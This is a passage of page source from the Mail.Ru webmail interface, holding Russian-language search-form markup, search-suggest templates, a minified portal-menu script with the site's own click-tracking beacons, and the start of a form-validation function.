					<div class="form__checkbox"><label><input tabindex="1008" id="attached" class="form__checkbox__checkbox" value="1" name="q_attach" type="checkbox"><span class="form__checkbox__label">С вложениями</span></label></div>
				</div>
			</div>
		</div>
	</div>
	<div class="popup__controls popup__controls_align-with-controls">
		
			<button type="submit" class="btn btn_main btn_stylish" data-act="search_advanced"><span class="btn__text">Найти</span></button>
			
				<button class="btn btn_stylish js-close"><span class="btn__text">Отмена</span></button>
			
		
	</div>
</form>



				</div>
			
		</div>
	</div>
	<div id="w-pm-menu_submenu" class="w-pm-menu w-pm-menu_submenu" style="display: none;">
		<div class="portal-menu_width">
			<div class="pm-menu pm-menu_submenu">
				<div class="pm-menu__center pm-menu__center_submenu">
					<div class="pm-menu__center__inner pm-menu__center__inner_submenu">
						<i class="pm-menu__center__inner__leg pm-menu__center__inner__leg_submenu">s</i>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="w-pm-menu__shadow"></div>
</div>

<script id="portal-menu__search__suggest__template" type="text/plain">
	<span class="js-suggest pm-toolbar__suggests" style="display:none;">
		<span class="pm-toolbar__suggests__group pm-toolbar__suggests__group_first js-suggest-list">
		</span>
		<span class="pm-toolbar__suggests__searchin">
			<span class="pm-toolbar__suggests__searchin__wrapper w-portal-menu__search__suggest__item_internet">
				<a cnt_sb="427956" class="pm-toolbar__suggests__searchin__link portal-menu__search__suggest__item_internet js-suggest-internet-cont" target="_blank">
					Найти <span class="js-suggest-internet portal-menu__search__suggest__item_internet-link"></span> в&nbsp;интернете
				</a>
			</span>
		</span>
	</span>
</script>


	<script id="portal-menu__search__operands__template" type="text/plain">
		<div class="w-portal-menu__search__operands" style="display:none;">
			<div class="w-portal-menu__search__operands__width_outer">
				<div class="w-portal-menu__search__operands__width_inner">
					<table class="portal-menu__search__operands">
						<tr>
							<td style="display:none" data-operand-name="q_from" class="w-portal-menu__search__operands__menu w-portal-menu__search__operands__menu_q_from">
								<div class="portal-menu__search__operands__menu">
									<div class="portal-menu__search__operands__menu__button">
										<span class="portal-menu__search__operands__menu__button__text">от</span>
										<span class="portal-menu__search__operands__menu__button__ico"></span>
									</div>
									<div class="portal-menu__dropdown portal-menu__search__operands__menu__dropdown">
										<div data-operand-name="q_from" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_from">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">от</span>
											</span>
										</div>
										<div data-operand-name="q_to" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_to">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">кому</span>
											</span>
										</div>
										<div data-operand-name="q_subj" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_subj">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">тема</span>
											</span>
										</div>
										<div data-operand-name="q_query" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_query">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">в письме</span>
											</span>
										</div>
									</div>
								</div>
							</td>
							<td style="display:none" data-operand-name="q_from" class="w-portal-menu__search__operands__input w-portal-menu__search__operands__input_q_from">
								<label class="portal-menu__search__operands__input">
									<input class="portal-menu__search__operands__input__field" data-input-name="q_from" />
								</label>
							</td>
							<td style="display:none" data-operand-name="q_to" class="w-portal-menu__search__operands__menu w-portal-menu__search__operands__menu_q_to">
								<div class="portal-menu__search__operands__menu">
									<div class="portal-menu__search__operands__menu__button">
										<span class="portal-menu__search__operands__menu__button__text">кому</span>
										<span class="portal-menu__search__operands__menu__button__ico"></span>
									</div>
									<div class="portal-menu__dropdown portal-menu__search__operands__menu__dropdown">
										<div data-operand-name="q_from" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_from">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">от</span>
											</span>
										</div>
										<div data-operand-name="q_to" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_to">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">кому</span>
											</span>
										</div>
										<div data-operand-name="q_subj" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_subj">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">тема</span>
											</span>
										</div>
										<div data-operand-name="q_query" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_query">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">в письме</span>
											</span>
										</div>
									</div>
								</div>
							</td>
							<td style="display:none" data-operand-name="q_to" class="w-portal-menu__search__operands__input w-portal-menu__search__operands__input_q_to">
								<label class="portal-menu__search__operands__input">
									<input class="portal-menu__search__operands__input__field" data-input-name="q_to" />
								</label>
							</td>
							<td style="display:none" data-operand-name="q_subj" class="w-portal-menu__search__operands__menu w-portal-menu__search__operands__menu_q_subj">
								<div class="portal-menu__search__operands__menu">
									<div class="portal-menu__search__operands__menu__button">
										<span class="portal-menu__search__operands__menu__button__text">тема</span>
										<span class="portal-menu__search__operands__menu__button__ico"></span>
									</div>
									<div class="portal-menu__dropdown portal-menu__search__operands__menu__dropdown">
										<div data-operand-name="q_from" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_from">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">от</span>
											</span>
										</div>
										<div data-operand-name="q_to" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_to">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">кому</span>
											</span>
										</div>
										<div data-operand-name="q_subj" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_subj">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">тема</span>
											</span>
										</div>
										<div data-operand-name="q_query" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_query">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">в письме</span>
											</span>
										</div>
									</div>
								</div>
							</td>
							<td style="display:none" data-operand-name="q_subj" class="w-portal-menu__search__operands__input w-portal-menu__search__operands__input_q_subj">
								<label class="portal-menu__search__operands__input">
									<input class="portal-menu__search__operands__input__field" data-input-name="q_subj" />
								</label>
							</td>
							<td style="display:none" data-operand-name="q_query" class="w-portal-menu__search__operands__menu w-portal-menu__search__operands__menu_q_query">
								<div class="portal-menu__search__operands__menu">
									<div class="portal-menu__search__operands__menu__button">
										<span class="portal-menu__search__operands__menu__button__text">в письме</span>
										<span class="portal-menu__search__operands__menu__button__ico"></span>
									</div>
									<div class="portal-menu__dropdown portal-menu__search__operands__menu__dropdown">
										<div data-operand-name="q_from" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_from">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">от</span>
											</span>
										</div>
										<div data-operand-name="q_to" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_to">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">кому</span>
											</span>
										</div>
										<div data-operand-name="q_subj" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_subj">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">тема</span>
											</span>
										</div>
										<div data-operand-name="q_query" class="js-section portal-menu__dropdown__list__item portal-menu__search__operands__menu__dropdown__item_q_query">
											<span class="portal-menu__dropdown__list__link">
												<span class="portal-menu__dropdown__list__text">в письме</span>
											</span>
										</div>
									</div>
								</div>
							</td>
							<td style="display:none" data-operand-name="q_query" class="w-portal-menu__search__operands__input w-portal-menu__search__operands__input_q_query">
								<label class="portal-menu__search__operands__input">
									<input class="portal-menu__search__operands__input__field" data-input-name="q_query" />
								</label>
							</td>
						</tr>
					</table>
				</div>
			</div>
		</div>
	</script>



<script>(function(){function a(a){a=a||{};for(var b=1,c=arguments.length;c>b;b++){var d=arguments[b];for(var e in d)d.hasOwnProperty(e)&&(a[e]=d[e])}return a}function b(a){return document.getElementById(a)}function c(a){return a.bind.apply(a,H.call(arguments,1))}function d(a,b,c){function d(){a(),f||(e=E(d,b))}var e,f;return c&&a(),e=E(d,b),function(){f=!0,F(e)}}function e(a){a.stopPropagation?a.stopPropagation():a.cancelBubble=!0,a.preventDefault?a.preventDefault():a.returnValue=!1}function f(a){a.preventDefault?a.preventDefault():a.returnValue=!1}function g(a,b,c,d){b&&(b.addEventListener?b[a?"addEventListener":"removeEventListener"](c,d,!1):b[a?"attachEvent":"detachEvent"]("on"+c,d))}function h(a){return a&&1==a.nodeType}function i(a,b){var c=[],d=0;if("string"==typeof a)c.push([a,b]),d+=b;else for(var e in a)a.hasOwnProperty(e)&&(c.push([e,a[e]]),d+=a[e]);for(var f=0,g=c.length;g>f;f++)c[f]=c[f].join(":")}function j(a){function b(a){var b,c,d=parseInt(1e9*Math.random(),10);(b=a.match(/^(?:cl([bn])|([adgin]))(\d+)(?:sz(\d+))?/))&&(b[1]?c="s"+b[1]:"n"==b[2]?c="nc":"i"==b[2]?(d=null,c=b[2]):c=b[2],c+=b[3]+".gif?",b[4]&&(c+="sz="+b[4]),d&&(c+="&rnd="+d),(new Image).src="//r.my.com/"+c)}for(var c=a.split(","),d=c.length;d--;)b(c[d])}function k(a){g(1,a,"mousedown",function(a){a||(a=window.event);for(var b=a.target||a.srcElement;b;)b.getAttribute&&b.getAttribute("xname")&&j(b.getAttribute("xname")),b=b.parentNode})}function l(a,b){var c;c=h(b)?function(a,b){return a==b}:function(a,b){return n(a,b)};for(var d=a.parentNode;d;){if(c(d,b))return d;d=d.parentNode}return!1}function m(a){for(;a.firstChild;)a.removeChild(a.firstChild)}function n(a,b){return h(a)&&I?a.classList.contains(b):!!~(" "+a.className+" ").indexOf(" "+b+" ")}function o(a,b){h(a)&&(I?a.classList.add(b):!n(a,b)&&(a.className+=" "+b))}function p(a,b){h(a)&&(I?a.classList.remove(b):a.className=a.className.replace(new RegExp("(^|\\s)"+b+"(\\s|$)","g"),"$1"))}function q(a,b){return h(a)?I?a.classList.toggle(b):n(a,b)?(p(a,b),!1):(o(a,b),!0):void 0}function r(a,b){for(var c in b)Object.prototype.hasOwnProperty.call(b,c)&&!Object.prototype.hasOwnProperty.call(a,c)&&(a[c]=b[c]);return a}function s(a,b,c){function d(e){(c&&e.propertyName===c||!c)&&(g(0,a,B.Modernizr.transitionend,d),b())}var e;return c&&(c=B.Modernizr.prefixedCss(c)),B.Modernizr.csstransitions?g(1,a,B.Modernizr.transitionend,d):e=B.setTimeout(function(){b()},0),{prop:c,callback:b,node:a,cancel:function(){e?clearTimeout(e):g(0,a,B.Modernizr.transitionend,d)}}}function t(a){return a||(a={}),"function"!=typeof a.fn?!1:a}function u(a,b,c){function d(b){if(k&&(b.propertyName||b.originalEvent.propertyName)===k||!k){if(h)return;h=!0,clearTimeout(f),B.$(a).unbind(B.Modernizr.transitionend,d),j.fn()}}function e(){n||(clearTimeout(g),clearTimeout(f),B.$(a).unbind(B.Modernizr.transitionend,d),n=!0)}c||(c={});var f,g,h,i=c.before&&(c.before=t(c.before)),j=c.after&&(c.after=t(c.after)),k=j&&j.prop&&B.Modernizr.prefixedCss(j.prop),l=B.Modernizr.prefixed("transitionDuration"),m=l&&$(a).css(l);m&&(m=m.indexOf("ms")>-1?parseFloat(m):1e3*parseFloat(m)),i&&i.fn(),g=setTimeout(function(){b()},B.Modernizr.csstransitions?20:0),j&&(B.Modernizr.csstransitions?(B.$(a).bind(B.Modernizr.transitionend,d),m&&(f=setTimeout(function(){d(k?{propertyName:k}:void 0)},m))):f=setTimeout(function(){j.fn()},0));var n=!1;return{cancel:e}}function v(){this._invocations=[],this._fn=null,this._context=null}function w(){}function x(){function a(){c.appendChild(b)}var b=document.createElement("script"),c=document.getElementsByTagName("head")[0];b.async="async",b.defer="defer",b.type="text/javascript",b.charset="utf-8";var d=-1==location.href.indexOf("PMDebug")?".min":"";b.src=A.settings.staticDir+(A.settings.noCss?"nocss":"external")+d+".js","opera"in window&&"complete"!==document.readyState?window.addEventListener("DOMContentLoaded",function(){a()},!1):a()}var y=window.__PH&&__PH.cookie&&"1"===__PH.cookie.s.getGlobal("s_debug"),z=y&&window.console||{};if(z.log=y&&z.log||function(){},z.time=y&&z.time||function(){},z.timeEnd=y&&z.timeEnd||function(){},z.time("portal-menu.inline.js"),!window.__PM){var A=window.__PM={},B={};A.settings=window.__PMS||{},A.settings.staticDir="//img.imgsmail.ru/p/pm/d/0.1.46/",A.settings.noCss=!0,A.settings.rootClass="portal-menu",A.settings.cssPrefix="pm",A._=B;var C=B.Modernizr=function(a,b,c){function d(a){s.cssText=a}function e(a,b){return typeof a===b}function f(a,b){return!!~(""+a).indexOf(b)}function g(a,b){for(var d in a){var e=a[d];if(!f(e,"-")&&s[e]!==c)return"pfx"==b?e:!0}return!1}function h(a,b,d){for(var f in a){var g=b[a[f]];if(g!==c)return d===!1?a[f]:e(g,"function")?g.bind(d||b):g}return!1}function i(a,b,c){var d=a.charAt(0).toUpperCase()+a.slice(1),f=(a+" "+v.join(d+" ")+d).split(" ");return e(b,"string")||e(b,"undefined")?g(f,b):(f=(a+" "+w.join(d+" ")+d).split(" "),h(f,b,c))}var j,k,l,m="2.8.3",n={},o=!0,p=b.documentElement,q="modernizr",r=b.createElement(q),s=r.style,t=({}.toString," -webkit- -moz- -o- -ms- ".split(" ")),u="Webkit Moz O ms",v=u.split(" "),w=u.toLowerCase().split(" "),x={},y=[],z=y.slice,A=function(a,c,d,e){var f,g,h,i,j=b.createElement("div"),k=b.body,l=k||b.createElement("body");if(parseInt(d,10))for(;d--;)h=b.createElement("div"),h.id=e?e[d]:q+(d+1),j.appendChild(h);return f=["&#173;",'<style id="s',q,'">',a,"</style>"].join(""),j.id=q,(k?j:l).innerHTML+=f,l.appendChild(j),k||(l.style.background="",l.style.overflow="hidden",i=p.style.overflow,p.style.overflow="hidden",p.appendChild(l)),g=c(j,a),k?j.parentNode.removeChild(j):(l.parentNode.removeChild(l),p.style.overflow=i),!!g},B=function(b){var c=a.matchMedia||a.msMatchMedia;if(c)return c(b)&&c(b).matches||!1;var d;return A("@media "+b+" { #"+q+" { position: absolute; } }",function(b){d="absolute"==(a.getComputedStyle?getComputedStyle(b,null):b.currentStyle).position}),d},C={}.hasOwnProperty;l=e(C,"undefined")||e(C.call,"undefined")?function(a,b){return b in a&&e(a.constructor.prototype[b],"undefined")}:function(a,b){return C.call(a,b)},Function.prototype.bind||(Function.prototype.bind=function(a){var b=this;if("function"!=typeof b)throw new TypeError;var c=z.call(arguments,1),d=function(){if(this instanceof d){var e=function(){};e.prototype=b.prototype;var f=new e,g=b.apply(f,c.concat(z.call(arguments)));return Object(g)===g?g:f}return b.apply(a,c.concat(z.call(arguments)))};return d}),x.backgroundsize=function(){return i("backgroundSize")},x.boxshadow=function(){return i("boxShadow")},x.csstransitions=function(){return i("transition")};for(var D in x)l(x,D)&&(k=D.toLowerCase(),n[k]=x[D](),y.push((n[k]?"pm-":"pm-no-")+k));return n.addTest=function(a,b){if("object"==typeof a)for(var d in a)l(a,d)&&n.addTest(d,a[d]);else{if(a=a.toLowerCase(),n[a]!==c)return n;b="function"==typeof b?b():b,"undefined"!=typeof o&&o&&(p.className+=" "+(b?"pm-":"pm-no-")+a),n[a]=b}return n},d(""),r=j=null,n._version=m,n._prefixes=t,n._domPrefixes=w,n._cssomPrefixes=v,n.mq=B,n.testProp=function(a){return g([a])},n.testAllProps=i,n.testStyles=A,n.prefixed=function(a,b,c){return b?i(a,b,c):i(a,"pfx")},p.className=p.className.replace(/(^|\s)no-js(\s|$)/,"$1$2")+(o?" js "+y.join(" "):""),n}(window,window.document);C.addTest("classlist","classList"in document.documentElement),C.addTest("raf",!!C.prefixed("requestAnimationFrame",window));var D="{{ project }}",E=window.setTimeout,F=window.clearTimeout,G=b(A.settings.rootClass);Array.isArray||(Array.isArray=function(a){return"[object Array]"===Object.prototype.toString.call(a)});var H=Array.prototype.slice;void 0===Function.prototype.bind&&(Function.prototype.bind=function(a){var b=H.call(arguments,1),c=this;return function(){return c.apply(a,b.concat(H.call(arguments,0)))}});var I=B.Modernizr.classlist;Array.prototype.indexOf||(Array.prototype.indexOf=function(a){for(var b=this,c=0,d=b.length;d>c;c++)if(b[c]==a)return c;return-1}),a(B,{extend:a,animate:u,project:D,setTimeout:function(a,b){return E(a,b)},clearTimeout:function(a){return F(a)},rootNode:G,byId:b,bind:c,radar:i,setIntervalByTimeout:d,eventCancel:e,eventPreventDefault:f,event:g,isNode:h,emptyNode:m,count:j,countEl:k,hasParent:l,hasClass:n,removeClass:p,addClass:o,toggleClass:q,animateEnd:s,append:r}),B.Modernizr.prefixedCss=function(){var a=B.Modernizr.prefixed.apply(this,arguments);return a&&a.replace(/([A-Z])/g,function(a,b){return"-"+b.toLowerCase()}).replace(/^ms-/,"-ms-")},B.Modernizr.addTest("transitionend",function(){var a,b=document.createElement("fakeelement"),c={OTransition:"otransitionend",MSTransition:"msTransitionEnd",MozTransition:"transitionend",WebkitTransition:"webkitTransitionEnd",transition:"transitionend"};for(a in c)if(void 0!==b.style[a])return b=null,c[a]}),B.Modernizr.addTest("dpr",function(){return window.devicePixelRatio}),B.Modernizr.addTest("retina",function(){return B.Modernizr.dpr>1&&B.Modernizr.backgroundsize}),B.Modernizr.addTest("ie",function(){return navigator.userAgent.indexOf("MSIE")>0}),B.Modernizr.addTest("requestAnimationFrame",function(){return B.Modernizr.prefixed("requestAnimationFrame",window)}),B.extend(B,{}),B.SCookie=window.__PH&&window.__PH.cookie&&window.__PH.cookie.s,v.prototype={getQuery:function(){var a=B.bind(this.invoke,this);return a.replace=B.bind(this.replace,this),a},invoke:function(){this._fn?this._fn.apply(this._context,arguments):this._invocations.push(arguments)},replace:function(a,b){if(!this._fn){b=b||window;for(var c=0,d=this._invocations.length;d>c;c++)a.apply(b,this._invocations[c]);delete this._invocations,this._fn=a,this._context=b}}},B.DeferredQuery=v,w.prototype={emit:function(a,b,c){function d(){--g||c&&c()}void 0==b&&(b={});var e=this.listeners(a);if(!e)return void(c&&c());e=e.slice();for(var f=new w.Event(a,b),g=e.length,h=0,i=g;i>h;h++){var j=e[h];if("function"==typeof j)try{j.call(this,f,d)}catch(k){d()}}},listeners:function(a){return this._events&&this._events[a]&&this._events[a].length&&this._events[a]},addListener:function(a,b){if("function"!=typeof b)throw new Error("invalid argument");return this._events||(this._events={}),this._events[a]||(this._events[a]=[]),this._events[a].push(b),this.emit("newlistener",{type:a,listener:b}),this},once:function(a,b){function c(){this.removeListener(a,c),b.apply(this,arguments)}if("function"!=typeof b)throw new Error("invalid argument");return this.on(a,c),this},removeListener:function(a,b){if("function"!=typeof b)throw new Error("invalid argument");if(!this._events[a])return this;var c=this._events[a],d=c.indexOf(b);return 0>d?this:(c.splice(d,1),0===c.length&&delete this._events[a],this)}},w.prototype.on=w.prototype.addListener,w.Event=function(a,b){this.type=a,this.data=b},w.relay=function(a,b,c){for(var d=0,e=a.length;e>d;d++){var f=a[d];b.on(f,function(a){return function(){c.emit(a)}}(f))}},B.EventEmitter=w,B.extend(A,B.EventEmitter.prototype,{}),A.isLoaded=function(){return A._loaded||!1},A.whenLoaded=function(a){A.isLoaded()?a():A.on("load",a)},B.SCookie=window.__PH&&window.__PH.cookie&&window.__PH.cookie.s,A.regionSelector=new B.EventEmitter,B.extend(A.regionSelector,{show:(new B.DeferredQuery).getQuery(),hide:(new B.DeferredQuery).getQuery(),enabled:function(){return A.settings.regionsSelectorEnabled}}),A.draw=(new B.DeferredQuery).getQuery(),A.getItems=(new B.DeferredQuery).getQuery(),A.batchActions=(new B.DeferredQuery).getQuery(),B.initInline=function(){B.SCookie=window.__PH&&window.__PH.cookie&&window.__PH.cookie.s,B.addClass(B.rootNode,A.settings.rootClass+"_boxshadow-"+(B.Modernizr.boxshadow?"yes":"no")),A.settings.regionsSelectorEnabled=!!window.__PortalRegions,B.SCookie||(A.settings.regionsSelectorEnabled=!1),A.settings.submenu&&(document.getElementById(A.settings.rootClass+"__submenu").style.display="",document.getElementById("w-"+A.settings.cssPrefix+"-menu__shadow").style.display="none"),B.rootNode.style.height="",B.rootNode.style.height=B.rootNode.clientHeight+"px"},B.rootNode?B.initInline():A.init=(new B.DeferredQuery).getQuery(),x(),z.timeEnd("portal-menu.inline.js")}}).call(window);</script>


<script>
	function __rc(link, cnt){
		if( link.href ){
			var h = link.href, protocol = location.protocol, crp1 = /^(https?:)\/\//, crp2 = /^(\/)?/, matches;
			if (matches = h.match(crp1)) protocol = matches[1];
			var ch = '//r.' + patron.SingleDomainName + '/cl' + (protocol === 'https:' ? 'p' : 'n') + cnt + '/';
			link.href = crp1.test(h) ? h.replace(crp1, ch) : h.replace(crp2, ch + location.host + '/');
			setTimeout(function(){ link.href = h; }, 500);
		}
	}

(function ($) {
    var searchWidth = 250,
	    $window = $(window),
	    options = {};

    $.extend(true, options, {
	 logo: {
		image: (patron.isPddLogo) ? '//biz.mail.ru/portal_logo/' + patron.userdomain + '/logo.png' : '//img.imgsmail.ru/r/default/portal/0.1.29/logo.png',
		image_x2: (patron.isPddLogo) ? '//biz.mail.ru/portal_logo/' + patron.userdomain + '/logo_hidpi.png' : '//img.imgsmail.ru/r/default/portal/0.1.29/logo.HiDPI.png',
		title: 'Почта@Mail.Ru',
		href: '//mail.ru/',
		width: 135,
		height: 28,
		marginLeft: 52
	}
	
}
 
);
    $.extend(true, options, patron.pddConfig || {});

	

    __PM.draw(options, function (items) {
        var pm = $('#portal-menu');

		// MAIL-32926
		if ($.browser.safari) {
			// Force portal-menu repaint
			pm.display(false).parent().width();
			pm.display(true);
		}

		var isToolbar = !!(items && items.toolbar);

		pm	.find('.pm-toolbar__search__container')
				.attr('id', 'portal-menu__search')
//				.addClass('portal-menu__search_blur')
				.end()
			.find('.pm-toolbar__search__form')
				.attr('id', 'portal-menu__search__form')
				.addClass('js-form')
				.append( $('#portal-menu__search__suggest__template').html() )
				.end()
			.find('.pm-toolbar__search__params')
				.addClass('js-section-link')
				.end()
			.find('.pm-toolbar__search__placeholder')
				.addClass('js-labelText')
				.end()
			.find('.pm-toolbar__search__input')
				.attr('data-shortcut', '/')
				.addClass('js-shortcut')
				.end()
			.find('[data-name="ph-addressbook"] .js-link')
				.attr('data-shortcut', 'g,c')
				.addClass('js-shortcut')
				.end()
			.find('[data-name="ph-inbox"] .js-link')
				.attr('data-shortcut', 'g,i')
				.addClass('js-shortcut')
				.end()
			
				.find('.pm-toolbar__search__label__wrapper')
					.append( $('#portal-menu__search__operands__template').html() )
					.end()
				.find('.portal-menu__search__operands__input__field')
					.attr('data-shortcut', '/')
					.addClass('js-shortcut')
			
		;

		if (!isToolbar) { //Cant compeate init without toolbar
			return;
		}

		require(['patron.ui/patron.ui.SearchSuggest'], function (){

			
				var searchOperandsOpts = {
					items: {
						"от": "q_from",
						"кому": "q_to",
						"тема": "q_subj",
						"в письме": "q_query"
					}
					, order: {
						"от": 0,
						"кому": 1,
						"тема": 2,
						"в письме": 3
					}
					, deleteName : false
				};
				if( window.opera && typeof window.opera.version == "function" && (+window.opera.version() < 10)
					|| patron.isAddressbookPage()
				) {
					searchOperandsOpts = void 0;
				}
			

			patron.ui.PortalSearchSuggest = new patron.ui.SearchSuggest('#portal-menu__search' , {
				  cnBlur: 'portal-menu__search_blur'
				, cnPlaceholder : "portal-menu__search__label__text"
				, newSubElementsLogic: true

				
					, operands: searchOperandsOpts
				

				
					, clearSearchResultBasedOnHash : true
				

				, suggest: {
					  cnSelected: 'pm-toolbar__suggests__group__item_selected'
					, cnItemTick: 'pm-toolbar__suggests__group__item__text__searchtext'
					, cnItem: 'pm-toolbar__suggests__group__item'
					, cnList: 'pm-toolbar__suggests__group'
					, ajaxUrl:      '/cgi-bin/gosearch_ajax?ajax_call=1&func_name=ajax_suggest&data=["#query#"]&token=' + window['mailru_api_token']
					
						, grouping: true
						, groupsTitles: {//groupTiles - not for ajs.ui.suggests but for patron.ui.SearchSuggest
							"peoples": "Люди"
							, "inLetter": "В письме"
						}
						, controlHeight: true//controlHeight - not for ajs.ui.suggests but for patron.ui.SearchSuggest
						, cdGroupHeader: "pm-toolbar__suggests__group__title"
						, cdSuggestHint: 'pm-toolbar__suggests__group__item__text'
						, templateInternetVal: function(val) { return '&laquo;<b>' + val + '</b>&raquo;' }
						, template: function(b, a) {
                    		return a + "";
						}
						, emailItemHtml: function (data) {
							return (
								'<span style="position:relative;" data-search-name="q_from" data-suggest="' + data.suggest + '" class="js-dropdown-item pm-toolbar__suggests__group__item pm-toolbar__suggests__group__item_with-pic pm-toolbar__suggests__group__item_with-caption">' +
									'<span class="pm-toolbar__suggests__group__item__pic" style="background-image: url(' + data.avatar + ')"></span>' +
									'<span class="pm-toolbar__suggests__group__item__info pm-toolbar__suggests__group__item__info_with-pic pm-toolbar__suggests__group__item__info_with-caption">' +
										'<span class="pm-toolbar__suggests__group__item__text">' +
											data.createTick(data.name) +
										'</span>' +
										'<span class="pm-toolbar__suggests__group__item__caption">' +
											data.createTick(data.email) +
										'</span>' +
									'</span>' +
								'</span>'
							);
						}
						, resItemHtml: function (data) {
							return (
								'<span data-search-name="q_query" data-suggest="' + data.str + '" class="js-dropdown-item pm-toolbar__suggests__group__item">' +
									'<span class="pm-toolbar__suggests__group__item__info">' +
										'<span class="pm-toolbar__suggests__group__item__text">' +
											data.createTick(data.str) +
										'</span>' +
									'</span>' +
								'</span>'
							);
						}
					

					, escapeSuggestText: false
					, searchPeopleOnlyForEmail: true
				}
			});

			

			
				$(window).bind("resize", function() {
					this.setSuggestNodesVisibility();
				}.throttle(250, patron.ui.PortalSearchSuggest));
			

			
		});
	});

})(jQuery);
</script>


	




					<script>
						patron.adStartupData = {};
						
					</script>
					
						

						

						<div id="splashAnimation">
						

						
						</div>

							<div id="LEGO">



								
									

									
										<div class="b-layout ">
											
											
											<div class="b-layout__col">
												<div style="float:left;width:100%">
													










	<script>
function CheckForm(form, mandatoryFields, patternFields, isOneField) {
	var badForm = false,
		badField,
		errors = [];

	function showError(field, text) {
		var field = $(field),
			row = field.closest('.form__row__subwidget');
		if (!row.length)
			row = field.closest('.form__row');

		if (row.length) {
			if (field.hasClass('form__field')) {
				field.addClass('form__field_error');
			}
			else if (field.hasClass('form__spinbox__field')) {
				field.addClass('form__spinbox__field_error');
			}
			else if (field.hasClass('form__select__select')) {
				field.closest('.form__select').addClass('form__select_error');
			}

			var message = row.find('.form__message');
			if (message.length) {
				if (!message.hasClass('form__message_error')) {
					message.data('originalText', message.text());
				}
				message.html(text);
				message.addClass('form__message_error');
			}

			if (!badForm) {
				field.focus();
				badForm = true;
			}
		}
		else {
			if (!badForm) {
				badField = field;
				badForm = true;
			}
		}
	}

	function hideError(row) {
		row.find('.form__field').removeClass('form__field_error');
		row.find('.form__spinbox__field').removeClass('form__spinbox__field_error');
		row.find('.form__select').removeClass('form__select_error');

		var message = row.find('.form__message');
		if (message.length) {
			var text = message.data('originalText');
			if (text !== undefined) {
				message.html(text).removeClass('form__message_error');
			}
			//message.removeClass('form__message_error');
		}
	}

	function showFormError(title, error) {
		if ($(form).closest('.popup').length) return;

		var container = $('.form__top-message_error');
		if (container.length && !$(form).data('alert')) {
			container.find('.form__top-message__text').html(title);
			container.show();
			container[0].scrollIntoView();
		}
		else {
			alert(title + ':\n' + errors.join('\n'));
		}
	}

	function hideFormError() {
		if ($(form).closest('.popup').length) return;

		$('.form__top-message_error').hide();
	}

	function hideAllErrors() {
		$('.form__row').each(function() {
			hideError($(this));
		});
		hideFormError();
	}


	hideAllErrors();

	
		var fields = [];
	

	if (mandatoryFields) {
		$.merge(fields, mandatoryFields);
	}

	for (var fieldIdx = 0; fieldIdx < fields.length; fieldIdx++) {
		var params = fields[fieldIdx],
			field = form[params.name],
			bad = false;
		if (typeof field === 'undefined') continue;

		if (field.type == null) {
			bad = true;
			for (var j = 0; j < field.length; ++j) {
				if (field[j].checked == true)
					bad = false;
			}
			if (bad && !errors.length) {
				field = field[0];
			}
		}
		else {
			switch (field.type) {
				case 'select-one':
					if (field[field.selectedIndex].value == '') {
						bad = true;
					}
					break;

				default:
					if (field.value.replace(/^\s+|\s+$/g,'') == '') {
						bad = true;
					}
			}
		}

		if (bad) {
			showError(field, 'Заполните обязательное поле');
			errors.push(params.prompt);
		}
	}

	if (badForm) {
		if (isOneField === true)
			showFormError('Не заполнено необходимое поле', errors);
		else
			showFormError('Не заполнены необходимые поля', errors);
		return false;
	}

	
		var fields = [];
	

	if (patternFields) {
		$.merge(fields, patternFields);
	}

	for (var fieldIdx = 0; fieldIdx < fields.length; fieldIdx++) {
		var params = fields[fieldIdx],
			field = form[params.name],
			bad = false;
		if (typeof field === 'undefined' || !field.value) continue;
		var value = field.value;

		if (value.length > params.maxLen && params.maxLen > 0) {
			bad = true;
		}
		if (value.length < params.minLen && params.minLen > 0) {
			bad = true;
			if (params.name === "Password") {
				params.error = 'Слишком простой пароль.\nВы ввели пароль, который легко подобрать. Из соображений безопасности Вам нужно задать более сложный пароль.';
			}
		}

		if (params.pattern) {
			var re = new RegExp(params.pattern);
			if (!re.test(value + "")) {
				bad = true;
			}
		}

		if ((params.minVal > 0) || (params.maxVal > 0)) {
			var val = parseInt(value, 10);
			if ((val < params.minVal) || (val > params.maxVal)) {
				bad = true;
			}
		}

